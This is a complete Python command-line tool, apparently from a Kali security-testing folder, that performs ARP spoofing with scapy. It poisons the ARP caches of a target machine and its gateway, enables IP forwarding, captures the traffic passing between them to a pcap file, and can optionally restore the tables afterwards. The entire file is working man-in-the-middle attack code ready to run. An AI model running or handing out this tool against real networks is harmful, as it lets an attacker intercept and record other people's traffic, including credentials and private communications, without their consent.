#!/home/kali/cyber-attack-test/env/bin/python
from multiprocessing import Process, Event
from ipaddress import ip_address
from scapy.all import ARP, Ether, conf, sendp, sniff, srp, wrpcap # type: ignore
from datetime import datetime
from time import sleep
import argparse
import atexit
import sys
import os


def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

def enable_forwarding():
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == 1:
                return
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
    except Exception as e:
        print(e)
        exit(1)
    def restore():
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
        except Exception as e:
            print(e)
            exit(1)
    atexit.register(restore)


class Arper:
    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True):
        '''
        :param target: Target IPv4 address
        :param gateway: Gateway IPv4 address
        :param interface: Selected network interface
        :param count: Number of packets to sniff, default is 200
        :param autorestore: Whether to restore ARP table automatically, default is True
        '''
        try:
            addr1, addr2 = ip_address(target), ip_address(gateway)
            if (addr1.version != 4) or (addr2.version != 4):
                sys.exit('ARP cache poisoning is ineffective against IPv6')
        except Exception as e:
            sys.exit(f'Invalid input: {e}')
        self.autorestore = autorestore
        self.target = target
        self.target_mac = get_mac(self.target)
        if self.target_mac is None:
            sys.exit('Target not found')
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.count = count
        self.interface = interface
        self.delay = delay
        self.poison_event = Event()
        self.sniff_event = Event()
        conf.iface = interface
        conf.verb = 0

        print(f'Initialised {interface}: ')
        print(f'Gateway ({gateway}) is at {self.gateway_mac}. ')
        print(f'Target ({target}) is at {self.target_mac}')
        print('-' * 30)

    def run(self):
        self.sniff_process = Process(target=self.sniff)
        self.sniff_process.start()
        sleep(1)
        poison_process = Process(target=self.poison)
        poison_process.start()
        self.sniff_process.join()
        poison_process.join()

    def poison(self):
        ether1 = Ether(dst=self.target_mac)
        arp1 = ARP(op=2, psrc=self.gateway, pdst=self.target, hwdst=self.target_mac)
        poison_target = ether1 / arp1

        print(f'IP src: {poison_target[ARP].psrc}')
        print(f'IP dst: {poison_target[ARP].pdst}')
        print(f'MAC src: {poison_target[Ether].src}')
        print(f'MAC dst: {poison_target[Ether].dst}')
        print(poison_target.summary())
        print('-' * 30)

        ether2 = Ether(dst=self.gateway_mac)
        arp2 = ARP(op=2, psrc=self.target, pdst=self.gateway, hwdst=self.gateway_mac)
        poison_gateway = ether2 / arp2
        
        print(f'IP src: {poison_gateway[ARP].psrc}')
        print(f'IP dst: {poison_gateway[ARP].pdst}')
        print(f'MAC dst: {poison_gateway[Ether].dst}')
        print(f'MAC src: {poison_gateway[Ether].src}')
        print(poison_gateway.summary())
        print('-' * 30)
        print('Beginning the ARP poison. [CTRL-C to stop]')

        while not self.poison_event.wait(0):
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                sendp(poison_target)
                sendp(poison_gateway)
            except KeyboardInterrupt:
                self.sniff_process.kill()
                self.restore()
                print('Aborted')
                return
            else:
                sleep(self.delay)
        self.restore()

    def sniff(self):
        print(f'Sniffing {self.count} packets')
        bpf_filter = f'host {self.target} and host {self.gateway} and not arp'
        packets = sniff(count=self.count, filter=bpf_filter, iface=self.interface)
        self.poison_event.set()
        wrpcap(f"arper_{self.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
        print('Got the packets')

    def restore(self):
        '''
        Automatically restore the ARP table after the attack ends 
        or the attack is cancelled
        '''
        if self.autorestore:
            print('Restoring ARP tables...')
            sendp(
                Ether(src=self.gateway_mac, 
                      dst=self.target_mac) / 
                ARP(
                    op=2, 
                    psrc=self.gateway, 
                    hwsrc=self.gateway_mac, 
                    pdst=self.target, 
                    hwdst=self.target_mac, 
                    ), 
                count=5
                )
            sendp(
                Ether(src=self.target_mac, 
                      dst=self.gateway_mac) / 
                ARP(
                    op=2, 
                    psrc=self.target, 
                    hwsrc=self.target_mac, 
                    pdst=self.gateway, 
                    hwdst=self.gateway_mac
                    ), 
                count=5)

if __name__ == '__main__':
    '''main execution flow'''
    if os.getuid() != 0:
        print('Run it as root.')
        exit(1)
    enable_forwarding()
    parser = argparse.ArgumentParser(description='Perform ARP spoofing on the target machine')
    parser.add_argument('target',  help='IPv4 address of target machine')
    parser.add_argument('-g', '--g', metavar='gateway', required=True, help='IPv4 addr of gateway', dest='gateway')
    parser.add_argument('-i', '--i', metavar='interface', help='network interface', default='wlan0')
    parser.add_argument('-n', '--n', help='DO NOT restore ARP tables automatically\nBy default it will restore ARP tables before quitting', action='store_false')
    parser.add_argument('-num', '--num', type=int, metavar='number', help='number of packets to sniff', default=200)
    args = parser.parse_args()

    myarp = Arper(args.target, args.gateway, args.i, args.num, autorestore=args.n)
    myarp.run()